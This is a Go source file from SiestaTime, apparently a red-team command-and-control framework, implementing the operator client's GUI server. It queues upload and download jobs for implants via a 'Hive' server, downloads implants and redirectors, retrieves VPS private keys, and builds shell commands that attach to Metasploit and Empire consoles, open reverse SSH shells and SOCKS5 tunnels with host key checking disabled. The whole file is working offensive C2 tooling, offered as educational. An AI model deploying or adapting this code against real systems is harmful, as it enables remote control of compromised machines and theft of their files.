//{{{{{{{ GUI Servlet }}}}}}}
//By Rebujacker - Alvaro Folgado Rueda as an open source educative project


package main

import (
    "encoding/json"
    "github.com/gorilla/mux"
    "log"
    "net/http"
    "fmt"
    "bytes"
    "time"
    "os"
    "strings"
    "os/exec"
    "io/ioutil"
    "encoding/base64"
    "strconv"
    "sync"
)



//The following structs defines JSON commands that will be de-serialized between electronGUI and Client
type InteractObject struct {
    StagingName string   `json:"staging"`
    Handler string   `json:"handler"`
    VpsName string   `json:"vpsname"`
    TunnelPort string   `json:"tunnelport"`
    Socks5Port string   `json:"socks5port"`
}

type ReportObject struct {
    Name string   `json:"name"`
}

type ImplantObject struct {
    Name string   `json:"name"`
    OsName string   `json:"osname"`
    Arch string   `json:"arch"`
}



/*
Similarly to JobsToSend mem. shared array, these arrays will be defined to store GUI data on the client memory.
In this way, the response to feed/update electronGUI will be faster than waiting to receive the GUI data from Hive directly.
*/
type JobsMemoryDB struct {
    mux  sync.RWMutex
    Jobs []*Job
}
var jobsDB *JobsMemoryDB

type LogsMemoryDB struct {
    mux  sync.RWMutex
    Logs []*Log
}
var logsDB *LogsMemoryDB

type ImplantsMemoryDB struct {
    mux  sync.RWMutex
    Implants []*Implant
}
var implantsDB *ImplantsMemoryDB

type VpsMemoryDB struct {
    mux  sync.RWMutex
    Vpss []*Vps
}
var vpsDB *VpsMemoryDB

type DomainsMemoryDB struct {
    mux  sync.RWMutex
    Domains []*Domain
}
var domainsDB *DomainsMemoryDB

type StagingsMemoryDB struct {
    mux  sync.RWMutex
    Stagings []*Staging
}
var stagingsDB *StagingsMemoryDB

type RedsMemoryDB struct {
    mux  sync.RWMutex
    Redirectors []*Redirector
}
var redsDB *RedsMemoryDB

type BisMemoryDB struct {
    mux  sync.RWMutex
    Bichitos []*Bichito
}
var bisDB *BisMemoryDB

type ReportsMemoryDB struct {
    mux  sync.RWMutex
    Reports []*Report
}
var reportsDB *ReportsMemoryDB



/*
These two lock structs are used to limit the number of reads/jobs that client can receive per unit of time:

lockObject --> When cliking buttons around the electronGUI, each request will trigger an update of data (implants,domains...)
The "Update of data", will be a request issued from the client to Hive. This lock will limit is concurrency by 3 at a time.

joblockObject --> Similarly to the previous idea, this lock will limit the issue of Jobs to Hive at a concurency of 3.
*/
type lockObject struct {
    mux  sync.RWMutex
    Lock int
}

var lock *lockObject

type joblockObject struct {
    mux  sync.RWMutex
    Lock int
}

var joblock *joblockObject


//Function to build the http server and start listening for electronGUI Requests
func guiHandler() {


    //Initialize On Mem shared arrays for GUI Data
    var (
        jobs        []*Job
        logs        []*Log
        implants    []*Implant
        vpss        []*Vps
        domains     []*Domain
        stagings    []*Staging
        redirectors []*Redirector
        bichitos    []*Bichito
        reports     []*Report
    )

    jobsDB =        &JobsMemoryDB{Jobs:jobs}
    logsDB =        &LogsMemoryDB{Logs:logs}
    implantsDB =    &ImplantsMemoryDB{Implants:implants}
    vpsDB =         &VpsMemoryDB{Vpss:vpss}
    domainsDB =     &DomainsMemoryDB{Domains:domains}
    stagingsDB =    &StagingsMemoryDB{Stagings:stagings}
    redsDB =        &RedsMemoryDB{Redirectors:redirectors}
    bisDB =         &BisMemoryDB{Bichitos:bichitos}
    reportsDB =     &ReportsMemoryDB{Reports:reports}
    
    lock = &lockObject{Lock:3}
    joblock = &joblockObject{Lock:3}

    //Before starting the listener, take a time to refresh the most updated Hive data for feeding the electronGUI
    getHive("jobs")
    getHive("logs")
    getHive("implants")
    getHive("vps")
    getHive("domains")
    getHive("stagings")
    getHive("bichitos")
    getHive("redirectors")
    getHive("reports")


    //Initialize the router
    router := mux.NewRouter()
    router.Use(commonMiddleware)

    //GUI GET Servlet
    router.HandleFunc("/jobs", GetJobs).Methods("GET")
    router.HandleFunc("/logs", GetLogs).Methods("GET")
    router.HandleFunc("/implants", GetImplants).Methods("GET")
    router.HandleFunc("/vps", GetVps).Methods("GET")
    router.HandleFunc("/domains", GetDomains).Methods("GET")
    router.HandleFunc("/stagings", GetStagings).Methods("GET")
    router.HandleFunc("/reports", GetReports).Methods("GET")
    router.HandleFunc("/redirectors", GetRedirectors).Methods("GET")
    router.HandleFunc("/bichitos", GetBichitos).Methods("GET")
    router.HandleFunc("/username", GetUsername).Methods("GET")

    //GUI POST Servlet
    router.HandleFunc("/job", CreateJob).Methods("POST")
    router.HandleFunc("/interact", Interact).Methods("POST")
    router.HandleFunc("/report", DownloadReport).Methods("POST")
    router.HandleFunc("/implant", DownloadImplant).Methods("POST")
    router.HandleFunc("/redirector", DownloadRedirector).Methods("POST")

    //Initialize the server with previous router
    log.Fatal(http.ListenAndServe(":"+clientPort, router))
}

/*
Get methods for the GUI:
A. The get methods will directly answer with an JSON encode data from the respective on memory shared array
B. A "Update target array" process will start, if there are anough concurrency slots in the "readlock"
*/
func GetJobs(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(jobsDB.Jobs)
    
    if(lock.Lock > -1){go getHive("jobs")}
}

func GetLogs(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(logsDB.Logs)

    if lock.Lock > -1 {go getHive("logs")}
}

func GetImplants(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(implantsDB.Implants)

    if lock.Lock > -1 {go getHive("implants")}
}

func GetVps(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(vpsDB.Vpss)

    if lock.Lock > -1 {go getHive("vps")}
}

func GetDomains(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(domainsDB.Domains)

    if lock.Lock > -1 {go getHive("domains")}
}

func GetStagings(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(stagingsDB.Stagings)

    if lock.Lock > -1 {go getHive("stagings")}
}

func GetReports(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(reportsDB.Reports)

    if lock.Lock > -1 {go getHive("reports")}
}


func GetRedirectors(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(redsDB.Redirectors)

    if lock.Lock > 0 {go getHive("redirectors")}
}

func GetBichitos(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(bisDB.Bichitos)

    if lock.Lock > 0 {go getHive("bichitos")}
}

func GetUsername(w http.ResponseWriter, r *http.Request) {
    tmp := UserAuth{username,""}
    json.NewEncoder(w).Encode(tmp)

}


/*
Post methods for the GUI: CreateJob
Description: This is the first electronGUI raw Jobs consumer. Its functionality is to prepare data received from the GUI
(assign a JID and timestamp) to be correctly consumed by hive Job Processor (./src/hivJobs.go)
Flow:
A. Build a new Job object with the data that comes from electronGUI (a command that is already JSON encoded)
    A1. Generate a JID
    A2. Asign a time to the creation of the Job

B.(Special Case) Upload --> 
    If the command is an "upload", the client will read a file from the Operator's machine and encode it within the Job towards Hive
C.(Special Case) Download -->
    If the command is an "Download", a flow to download a file from Hive will be initiated
D.Check if there is anough concurrency for an extra Job, if not drop it
*/
func CreateJob(w http.ResponseWriter, r *http.Request) {
    var(
        job Job
    )

    //Some basic CSRF protection with custom headers, will Implement csrf tokens soon
    ua := r.Header.Get("User-Agent")
    if !strings.Contains(ua,"SiestaTime") {
        fmt.Println("There it was an attempt to perform a POST with a different User Agent: "+ua)
        return
    }

    ct := r.Header.Get("Content-Type")
    if !strings.Contains(ct,"application/json") {
        fmt.Println("There it was an attempt to perform a POST with a different Content-Type: "+ct)
        return
    }


    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)

    jid := fmt.Sprintf("%s%s","J-",randomString(8))
    time := time.Now().Format("02/01/2006 15:04:05 MST")
    
    //Decode JSON Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&job)
    if errDaws != nil {
        fmt.Println("Error Decoding Json"+ errDaws.Error())
    }

    job.Jid = jid
    job.Time = time

    //Prepare Upload Command: Read Operator file to upload and put into the Job
    if (job.Job == "upload"){
        
        //Use spaces to get both argumens, if not two of them error
        arguments := strings.Split(job.Parameters," ")
        if len(arguments) != 2 {
            fmt.Println("Incorrect Number of params")
        }  
        //Read first argument as a PATH file
        data, err := ioutil.ReadFile(arguments[0])
        if err != nil {
            fmt.Println("Error Reading File: "+err.Error())
        }

        //Set the output of the file on "Result"
        job.Result = base64.StdEncoding.EncodeToString(data)

    }

    //Prepare Download Command: Get JID result from Hive and decode it into target
    if (job.Job == "download"){
        //Use spaces to get both argumens, if not two of them error
        arguments := strings.Split(job.Parameters," ")
        if len(arguments) != 2 {
            fmt.Println("Incorrect Number of params")
        }  

        go downloadJID(jid,job.Chid,arguments[1])
    }


    //Check if there is gap to queue more Jobs against Hive
    if joblock.Lock > 0 {
        go postHive(&job)
        fmt.Fprint(w, "[{\"jid\":\""+jid+"\"}]")
    }else{
        fmt.Fprint(w, "Client Queue Full")  
    }
    

    return
}


//Download from Hive the result from one particular JID,use bichito resptime to try 3 times
func downloadJID(jid string,chid string,filepath string){

    //Get bichito resptime
    var resptime int
    var result string
    var errGetJob string

    for _,bichito := range bisDB.Bichitos{
        if chid == bichito.Bid{
            resptime, _ = strconv.Atoi(bichito.Resptime)
        }
        
    } 

    //Try get result 3 times
    tries := 3
    for{
        time.Sleep(time.Duration(resptime + 20) * time.Second)
        errGetJob,result = getJIDResult(jid)
        if errGetJob == "" {
            break
        }

        tries--
        if tries == 0 {
            fmt.Println("Failed to download File from Bichito")
            return
        }
    }

    //If data, b64 decode it and write it in target operator filepath 
    decodedDownload, errD := base64.StdEncoding.DecodeString(result)
    if errD != nil {
        fmt.Println("Error b64 decoding Downloaded File: "+errD.Error())
        return
    }


    download, err := os.Create(filepath)
    if err != nil {
        fmt.Println("DownlaodFile:" + err.Error())
        return
    }

    defer download.Close()

    if _, err = download.WriteString(string(decodedDownload)); err != nil {
        fmt.Println("DownlaodFile:" + err.Error())
        return
    }

    return

}


/*
Post methods for the GUI: Interact
Description: This function will be used to create connections of different kind with remote servers.
Every connection will be tunneled through Hive, so the endpoint will be Hive always. These SSH connection have 30 seconds TTL (if non used).
FLow:
A. Decode the Job and extract data from the target object to interact with
B. Since most of the connections will be ssh tunneled (pem auth.), first of all a pem for the target network object needs to be downloaded.
    B1. Check if the pem key for the target server is in the Operator's folder
    B2. If not,Download it.
C. SSH connect to target object (through Hive), pop-up a terminal to the Operator, and:
    C1."droplet" --> Simply open a interactive ssh with the target
    C2."msfconsole/empire/[...]" --> SSH connect to the target, and attach the console to a running msf/empire/[...] process
    C3."ssh" --> Listen to a receiving SSH shell triggered by the implant
    [...]
*/

func Interact(w http.ResponseWriter, r *http.Request) {
    

    var(
        interact InteractObject
        sshPort string
        vpsName string
        hiveD string
    )


    //Some basic CSRF protection with custom headers, will Implement csrf tokens soon
    ua := r.Header.Get("User-Agent")
    if !strings.Contains(ua,"SiestaTime") {
        fmt.Println("There it was an attempt to perform a POST with a different User Agent: "+ua)
        return
    }

    ct := r.Header.Get("Content-Type")
    if !strings.Contains(ct,"application/json") {
        fmt.Println("There it was an attempt to perform a POST with a different Content-Type: "+ct)
        return
    }


    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)
    
    //DEcode JSOn Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&interact)
    if errDaws != nil {
        fmt.Println("Error Decoding JSon"+ errDaws.Error())
    }

    //Get StagingName and VPSName using Job json object

    stagingName := interact.StagingName
    sshPort = interact.TunnelPort
    vpsName = interact.VpsName
    hiveD = strings.Split(roasterString,":")[0]

    //Check if vpsname.pem is on vpskeys, if not download it from Hive.
    var outbuf, errbuf bytes.Buffer
    cmd_path := "/bin/sh"
    cmd := exec.Command(cmd_path, "-c","ls ./vpskeys")
    cmd.Stdout = &outbuf
    cmd.Stderr = &errbuf
    cmd.Run()
    stdout := outbuf.String()
    stderr := errbuf.String()
    if stderr != ""{
        fmt.Println(stderr+stdout)
    }

    //Perform Input sanitation
    if !namesInputWhite(stagingName){
        fmt.Println("Dangerous Input For Interact: "+stagingName)
        return
    }

    if !namesInputWhite(username){
        fmt.Println("Dangerous Input For Interact: "+username)
        return
    }

    if !namesInputWhite(interact.Handler){
        fmt.Println("Dangerous Input For Interact: "+interact.Handler)
        return
    }    

    if !domainsInputWhite(hiveD){
        fmt.Println("Dangerous Input For Interact: "+hiveD)
        return
    }

    if !tcpPortInputWhite(sshPort){
        fmt.Println("Dangerous Input For Interact: "+sshPort)
        return
    }

    if (!tcpPortInputWhite(interact.Socks5Port) && !(interact.Socks5Port == "")){
        fmt.Println("Dangerous Input For Interact: "+interact.Socks5Port)
        return
    }

    if !strings.Contains(outbuf.String(),stagingName){

        //If note retrieve vpskey from Hive
        key_string := getKey(vpsName)
        if !strings.Contains(key_string,"-----BEGIN RSA PRIVATE KEY-----"){
            return
        }

        vpskey, err := os.Create("./vpskeys/"+stagingName+".pem")
        if err != nil {
            fmt.Println(err.Error())
        }

        defer vpskey.Close()

        if _, err = vpskey.WriteString(key_string); err != nil {
            fmt.Println(err.Error())
        }

    cmd = exec.Command("/bin/bash", "-c","chmod 600 ./vpskeys/"+stagingName+".pem")
    cmd.Run()

    }

    timeLog := time.Now().Format("02/01/2006 15:04:05 MST")

    // In relation with the kind of target, trigger a differnet set of commands to engage the connection.
    // This will pop-up a new terminal
    var command string

    switch interact.Handler {

    case "droplet":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;sudo bash|tee -a "+interact.Handler+".log'" 
    case "msfconsole":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;sudo reptyr -s $(pgrep ruby)|tee -a "+interact.Handler+".log'" 
    case "empire":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;sudo reptyr -s $(pgrep python)|tee -a "+interact.Handler+".log'" 
    case "ssh":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -t -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;./tools revsshclient 2222|tee -a "+interact.Handler+".log'"
    case "socks5":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -t -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem -L 127.0.0.1:"+interact.Socks5Port+":127.0.0.1:2222 ubuntu@"+hiveD+" -N"
    case "killssh":
        command = "ssh -oStrictHostKeyChecking=no -t -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo pkill -u anonymous'"
    }    


    outbuf.Reset()
    errbuf.Reset()
    cmd = exec.Command("/bin/bash", "-c",command)
    cmd.Stdout = &outbuf
    cmd.Stderr = &errbuf
    cmd.Run()
    stdout = outbuf.String()
    stderr = errbuf.String()
    if stderr != ""{
        fmt.Println(stderr+stdout)
    }


}


//Download a report File from Hive
func DownloadReport(w http.ResponseWriter, r *http.Request) {

    var(
        report ReportObject
    )

    //Some basic CSRF protection with custom headers, will Implement csrf tokens soon
    ua := r.Header.Get("User-Agent")
    if !strings.Contains(ua,"SiestaTime") {
        fmt.Println("There it was an attempt to perform a POST with a different User Agent: "+ua)
        return
    }

    ct := r.Header.Get("Content-Type")
    if !strings.Contains(ct,"application/json") {
        fmt.Println("There it was an attempt to perform a POST with a different Content-Type: "+ct)
        return
    }

    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)
    
    //Decode Json Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&report)
    if errDaws != nil {
        fmt.Println("Error Decoding Json"+ errDaws.Error())
    }

    if !namesInputWhite(report.Name){
        fmt.Println("Dangerous Input For Download Report: "+report.Name)
        return
    }

    error := getReport(report.Name)
    if error != "" {
       fmt.Println("Error Getting Report"+ error) 
    }
}

//Download a Implant from Hive
func DownloadImplant(w http.ResponseWriter, r *http.Request) {

    var(
        implant ImplantObject
    )

    //Some basic CSRF protection with custom headers, will Implement csrf tokens soon
    ua := r.Header.Get("User-Agent")
    if !strings.Contains(ua,"SiestaTime") {
        fmt.Println("There it was an attempt to perform a POST with a different User Agent: "+ua)
        return
    }

    ct := r.Header.Get("Content-Type")
    if !strings.Contains(ct,"application/json") {
        fmt.Println("There it was an attempt to perform a POST with a different Content-Type: "+ct)
        return
    }
 
    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)
    
    //Decode Json Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&implant)
    if errDaws != nil {
        fmt.Println("Error Decoding Json"+ errDaws.Error())
    }

    if !namesInputWhite(implant.Name){
        fmt.Println("Dangerous Input For Download Implant: "+implant.Name)
        return
    }

    error := getImplant(implant.Name,implant.OsName,implant.Arch)
    if error != "" {
       fmt.Println("Error Downloading Implant"+ error) 
    }
}

//Download a Redirector from Hive
func DownloadRedirector(w http.ResponseWriter, r *http.Request) {

    var(
        implant ImplantObject
    )

    //Some basic CSRF protection with custom headers, will Implement csrf tokens soon
    ua := r.Header.Get("User-Agent")
    if !strings.Contains(ua,"SiestaTime") {
        fmt.Println("There it was an attempt to perform a POST with a different User Agent: "+ua)
        return
    }

    ct := r.Header.Get("Content-Type")
    if !strings.Contains(ct,"application/json") {
        fmt.Println("There it was an attempt to perform a POST with a different Content-Type: "+ct)
        return
    }

    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)
    
    //Decode Json Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&implant)
    if errDaws != nil {
        fmt.Println("Error Decoding Json"+ errDaws.Error())
    }

    //Debug
    //fmt.Println("Downloading:"+implant.Name)
    
    if !namesInputWhite(implant.Name){
        fmt.Println("Dangerous Input For Download Redirector: "+implant.Name)
        return
    }

    error := getRedirector(implant.Name)
    if error != "" {
       fmt.Println("Error Downloading Redirector"+ error) 
    }
}


//HTTP Configurations over the Client listener
func commonMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        header := w.Header()
        //CSP
        csp := []string{"default-src: 'self'","object-src 'none'","","base-uri 'none'","script-src 'strict-dynamic'"}
        header.Set("Content-Type", "application/json")
        w.Header().Set("Content-Security-Policy", strings.Join(csp, "; "))
        w.WriteHeader(200)
        next.ServeHTTP(w, r)
    })
}